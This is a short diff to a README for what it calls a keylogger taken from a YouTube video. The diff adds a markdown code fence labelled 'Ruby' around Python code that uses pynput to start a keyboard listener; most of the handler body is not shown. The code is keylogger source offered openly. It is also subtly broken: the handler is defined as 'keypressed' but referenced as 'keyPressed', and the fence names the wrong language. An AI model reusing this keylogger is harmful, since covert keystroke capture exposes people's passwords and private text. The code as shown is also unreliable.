@@ -4,6 +4,8 @@ This is a keylogger referenced from Shaun Halverson Video on YT
 
 # CODE
 
+```Ruby
+
 from pynput import keyboard
 
 def keypressed(key):
@@ -20,3 +22,5 @@ if __name__ == "__main__":
     listener = keyboard.Listener(on_press=keyPressed)
     listener.start()
     input()
+
+```
